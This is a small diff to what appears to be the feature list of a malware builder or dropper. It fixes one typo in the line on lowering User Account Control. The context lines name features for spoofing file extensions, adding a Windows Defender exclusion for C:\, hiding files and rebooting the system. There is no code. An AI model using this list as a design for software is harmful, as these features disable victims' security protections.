@@ -15,7 +15,7 @@
 - Change Download Path
 - Extension Spoofing
 - Add Windows Defender Exclusion to C:\
-- Low User Account Control to the lowest Level
+- Lower User Account Control to the lowest Level
 - Show Message Box
 - Hide File
 - Reboot System
